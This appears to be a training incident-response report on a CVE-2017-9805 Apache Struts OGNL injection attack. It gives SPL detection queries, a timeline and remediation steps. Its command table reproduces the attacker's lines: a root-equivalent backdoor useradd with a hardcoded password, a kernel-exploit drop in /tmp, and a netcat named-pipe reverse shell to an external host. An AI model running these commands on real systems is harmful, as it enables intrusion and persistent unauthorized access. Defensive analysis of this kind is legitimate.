# IR-002 — Apache Struts RCE: Full Attack Chain (CVE-2017-9805)

| Field | Detail |
|-------|--------|
| **Incident ID** | IR-002 |
| **Date** | 2018-08-20 |
| **Severity** | Critical |
| **Status** | Closed |
| **MITRE ATT&CK** | T1190, T1059.004, T1136.001, T1548.001, T1105, T1071.001 |
| **CVE** | CVE-2017-9805 — Apache Struts REST Plugin RCE |
| **Analyst** | Atharva Acharya |
| **Dataset** | BOTS v3 (index=botsv3) |

---

## 1. Executive Summary

On 2018-08-20, a critical remote code execution attack was identified against an internal Apache Struts application hosted at `192.168.9.30`. The attacker at `192.168.8.103` exploited CVE-2017-9805, a vulnerability in the Apache Struts REST plugin allowing unauthenticated OGNL expression injection via HTTP POST requests. Following initial exploitation, the attacker conducted a systematic post-exploitation sequence: privilege enumeration, backdoor account creation, kernel exploit deployment, and establishment of a reverse shell to external C2 infrastructure at `45.77.53.176:8088`. This represents a complete attack chain from initial access through to persistent access and C2.

---

## 2. Detection

**Initial Alert:** SPL Rule 02 — Apache Struts RCE Detection (CVE-2017-9805)

**Detection Query:**
```spl
index=botsv3 sourcetype="stream:http"
| where match(form_data, "(?i)(ognl|OgnlContext|ProcessBuilder|Runtime\.exec|cmd=)")
| stats count by src_ip, dest_ip, uri_path
| sort -count
| table src_ip, dest_ip, uri_path, count
```

Alert fired on OGNL expression injection patterns in POST body targeting `/frothlyinventory/integration/saveGangster.action` on `192.168.9.30`.

---

## 3. Investigation

### 3.1 Confirming Exploitation

The initial alert identified OGNL injection patterns. The investigation first confirmed whether exploitation was successful or merely attempted.

**Query — Full command execution sequence:**
```spl
index=botsv3 sourcetype="stream:http" dest_ip="192.168.9.30"
| where match(form_data, "(?i)(OgnlContext|ProcessBuilder)")
| rex field=form_data "#cmd='(?P<command>[^']+)'"
| table _time, src_ip, command
| sort _time
```

This extracted the actual OS commands injected via the OGNL payload, confirming live remote code execution rather than failed attempts.

### 3.2 Reconstructing the Attack Chain

Each POST request contained a distinct OS command injected into the `name` parameter via OGNL expression syntax. Commands were extracted in chronological order to reconstruct attacker intent:

| Time (UTC) | Command | Purpose |
|------------|---------|---------|
| 12:05:43 | `id` | Confirm code execution, identify running user |
| 12:06:02 | `groups` | Enumerate group memberships |
| 12:06:20 | `cat /etc/passwd` | Enumerate local user accounts |
| 12:07:04 | `useradd -ou 0 -g 0 -M -N -r -s /bin/bash tomcat7 -p davidverve.com` | Create backdoor root user |
| 12:07:28 | `uname -a` | OS and kernel version fingerprinting |
| 12:07:47 | `lsb_release -a` | Linux distribution identification |
| 12:08:37 | `echo [base64 blob] >> /tmp/colonel` | Drop base64-encoded kernel exploit |
| 12:10:56 | `base64 --decode /tmp/colonel > /tmp/colonel.c` | Decode kernel exploit source |
| 12:11:27 | `cat /tmp/colonel.c` | Verify exploit decoded correctly |
| 12:11:47 | `md5sum /tmp/colonel.c` | Integrity check on exploit file |
| 12:13:57 | `/bin/sh 0</tmp/backpipe \| nc 45.77.53.176 8088 1>/tmp/backpipe` | Establish reverse shell to C2 |
| 12:34:01 | `/bin/sh 0</tmp/backpipe \| nc 45.77.53.176 8088 1>/tmp/backpipe` | Re-establish reverse shell |

### 3.3 Kernel Exploit Analysis

The base64 payload dropped to `/tmp/colonel` was decoded and identified as a Linux kernel privilege escalation exploit targeting Ubuntu 16.04.4 with kernel `4.4.0-116-generic`. The exploit leverages a BPF (Berkeley Packet Filter) vulnerability to overwrite credential structures in kernel memory and obtain a root shell. This is a local privilege escalation — meaning the Struts RCE gave the attacker code execution as the `tomcat` service account, and the kernel exploit elevated that to root.

### 3.4 Backdoor Account Creation

The `useradd` command created a local account with the following properties:

| Parameter | Value | Significance |
|-----------|-------|-------------|
| Username | tomcat7 | Masquerades as legitimate Tomcat service account |
| UID | 0 | Root-equivalent privileges |
| GID | 0 | Root group |
| Shell | /bin/bash | Interactive shell access |
| Password | davidverve.com | Hardcoded credential |

### 3.5 C2 Infrastructure

**Query — Outbound connections to C2:**
```spl
index=botsv3 sourcetype="stream:http"
| where match(dest_ip, "45\.77\.53\.176")
| stats count by src_ip, dest_ip, dest_port
```

The reverse shell connected to `45.77.53.176` on port `8088`. This IP is external infrastructure — likely a VPS purchased by the attacker to receive the reverse shell. The use of a named pipe (`/tmp/backpipe`) with netcat is a classic shell upgrade technique to achieve bidirectional communication.

### 3.6 Scanning Correlation

Cross-referencing with IR-001 confirmed that `172.16.197.137` conducted reconnaissance against `192.168.9.30` prior to exploitation. The Struts endpoint was likely identified during this scanning phase and subsequently targeted.

---

## 4. Timeline

| Time (UTC) | Event |
|------------|-------|
| ~12:00 | Reconnaissance against 192.168.9.30 (IR-001) |
| 12:05:43 | First Struts RCE payload — `id` command confirms execution |
| 12:06:02–12:07:04 | Privilege enumeration and backdoor account creation |
| 12:07:28–12:07:47 | OS fingerprinting for kernel exploit selection |
| 12:08:37 | Kernel exploit dropped to /tmp/colonel (base64 encoded) |
| 12:10:56–12:11:47 | Exploit decoded, verified, and prepared |
| 12:13:57 | Reverse shell established to 45.77.53.176:8088 |
| 12:34:01 | Reverse shell re-established (persistence confirmed) |

---

## 5. Findings

- **CVE-2017-9805** was successfully exploited against an unpatched Apache Struts instance
- Attacker achieved **unauthenticated remote code execution** as the Tomcat service account
- **Privilege escalation** was achieved via a Linux BPF kernel exploit (colonel.c)
- A **backdoor root account** (`tomcat7`, UID 0) was created for persistent access
- A **reverse shell** was established to external C2 at `45.77.53.176:8088`
- The reverse shell was **re-established 20 minutes later**, confirming active operator involvement

---

## 6. MITRE ATT&CK Mapping

| Technique | ID | Detail |
|-----------|----|--------|
| Exploit Public-Facing Application | T1190 | CVE-2017-9805 Apache Struts OGNL injection |
| Unix Shell | T1059.004 | OS commands executed via injected OGNL expressions |
| Create Local Account | T1136.001 | tomcat7 backdoor account (UID 0) |
| Exploitation for Privilege Escalation | T1548.001 | Linux BPF kernel exploit (colonel.c) |
| Ingress Tool Transfer | T1105 | Base64-encoded kernel exploit dropped via POST |
| Application Layer Protocol: Web | T1071.001 | Reverse shell tunnelled via netcat on port 8088 |

---

## 7. Recommendations

1. **Patch immediately** — CVE-2017-9805 was publicly disclosed in September 2017; a patch was available over 11 months before this attack
2. **Deploy WAF rules** — block OGNL expression syntax (`${`, `#cmd`, `OgnlContext`) in POST body
3. **Audit /etc/passwd** — remove tomcat7 account and any other UID 0 accounts not in baseline
4. **Rotate all credentials** on `192.168.9.30` — attacker had root access of unknown duration
5. **Block C2 infrastructure** — firewall egress to `45.77.53.176`; investigate for other internal hosts beaconing to this IP
6. **Scan for artefacts** — check `/tmp/` for backpipe, colonel, colonel.c on all Linux hosts
7. **Implement IMDSv2** — attacker with root access could have queried the metadata API (see IR-005)
8. **Network segmentation** — the Struts application had no business requirement for outbound internet access

---

## 8. Artifacts

| Type | Value |
|------|-------|
| Attacker IP | 192.168.8.103 |
| Target IP | 192.168.9.30 |
| C2 IP | 45.77.53.176 |
| C2 Port | 8088 |
| Exploited endpoint | /frothlyinventory/integration/saveGangster.action |
| CVE | CVE-2017-9805 |
| Backdoor account | tomcat7 (UID 0, password: davidverve.com) |
| Kernel exploit | /tmp/colonel.c (Ubuntu 16.04.4, kernel 4.4.0-116-generic) |
| Named pipe | /tmp/backpipe |
| Related incident | IR-001 (reconnaissance), IR-005 (IMDS abuse) |
